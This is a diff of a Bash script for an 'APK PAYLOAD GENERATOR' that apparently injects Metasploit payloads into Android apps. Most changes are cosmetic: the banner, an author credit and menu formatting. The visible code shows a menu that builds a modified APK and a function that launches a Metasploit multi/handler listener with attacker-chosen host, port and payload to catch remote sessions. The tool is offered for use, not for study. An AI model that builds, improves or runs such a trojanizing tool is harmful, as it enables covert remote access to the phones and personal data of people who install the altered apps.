@@ -8,7 +8,6 @@
 
 function ascii() {
 echo "$aqua
-
 _|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
     _|      _|    _|    _|  _|      _|    _|_|    _|
     _|      _|    _|      _|        _|    _|  _|  _|
@@ -16,8 +15,8 @@ _|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
     _|        _|_|    _|      _|  _|_|_|  _|      _| 
    
    ----------- APK PAYLOAD GENERATOR -----------
-$normal 
-"
+                                    - By KSAURAJ
+$normal "
 
 }      
 function setup() {
@@ -25,9 +24,9 @@ function setup() {
     pkg install nala git wget curl -y 
     if ! command -v msfconsole &> /dev/null
 	then
-		echo "$orange Metasploit not found. 
-Either install it manually or press 'Y' to continue.
-Do You want to install it? $normal"
+		echo "$orange Metasploit not found."
+        echo "Either install it manually or press 'Y' to continue."
+        echo "Do You want to install it? $normal"
 		read -rp "[?] Select [Y/n]> : " answer_1
         clear
             case "$answer_1" in
@@ -89,45 +88,37 @@ function start_handler() {
     msfconsole -x "use multi/handler; set LHOST $l_host ; set LPORT $l_port ; set PAYLOAD $PAYLOAD ; exploit"
 }
 function main() {
-echo "$orange
-
-_|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
-    _|      _|    _|    _|  _|      _|    _|_|    _|
-    _|      _|    _|      _|        _|    _|  _|  _|
-    _|      _|    _|    _|  _|      _|    _|    _|_|
-    _|        _|_|    _|      _|  _|_|_|  _|      _| 
-   
-   ----------- APK PAYLOAD GENERATOR -----------
-$normal       
+    clear
+    ascii
+    echo "  
     [1] - Generate Payload
     [2] - Start Listener
     [3] - Start Setup
-    [q] - Quit
-    "
-    
-    read -rp "[?] Select> : " answer
+    [q] - Quit"
+    echo ""
+    read -rp "    [?] Select : " answer
     clear
-    case "$answer" in
-        1*) 
-        ascii
-        get_lhost
-        get_lport
-        original_apk
-        modded_apk
-        gen_payload
-        ;;
-        2*)
-        ascii
-        start_handler
-        ;;
-        3*)
-        setup
-        ;;
-        q*)
-        echo -e $aqua " Good Bye !!"
-        exit 0
-        ;;
-    esac
+        case "$answer" in
+            1*) 
+                ascii
+                get_lhost
+                get_lport
+                original_apk
+                modded_apk
+                gen_payload
+            ;;
+            2*)
+                ascii
+                start_handler
+            ;;
+            3*)
+                setup
+            ;;
+            q*)
+                echo -e $aqua " Good Bye !!"
+                exit 0
+            ;;
+        esac
 }
 
 main
